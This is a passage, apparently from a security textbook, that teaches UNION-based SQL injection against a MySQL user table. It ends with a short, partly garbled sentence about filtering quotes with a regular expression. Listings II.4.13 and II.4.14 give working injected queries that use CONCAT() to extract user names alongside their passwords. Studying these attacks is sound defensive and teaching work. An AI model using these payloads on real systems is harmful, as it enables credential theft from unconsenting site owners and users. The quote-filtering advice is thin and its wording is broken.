After a working SQL request is obtained, the asterisk in the SELECT query can be expanded into columns.

# Listing II.4.13. The query with an expanded asterisk

```
SELECT * FROM userslist
WHERE name LIKE ''
UNION
SELECT id_user, name, pass, email, url FROM userslist
WHERE name LIKE '%'\nORDER BY name
```

However, switching the user name and password fields will not produce the desired result, because the user name also must be displayed. This problem is solved using the MySQL CONCAT() function, which returns a string produced by concatenating the argument strings. The modified query displaying user names and their passwords may look like one in Listing II.4.14.

# Listing II.4.14. Using the CONCAT() function

```
SELECT * FROM userslist
WHERE name LIKE ''
UNION
SELECT id_user, CONCAT(name,'| Password - ',pass), pass, email, url
FROM userslist
WHERE name LIKE '%'\nORDER BY name
```

The SQL injection string that should be passed instead of the user name is set off in bold. The final results of the SQL injection may look like those shown in Fig. II.4.8.

One way to protect against this attack is, with the help of a regular expression, the information supplied by users. For example, single quotation marks can be filtered out using the following regular expression: ^[^\|\']*$. An example of a script to implement the protection is shown in Listing II.4.15.
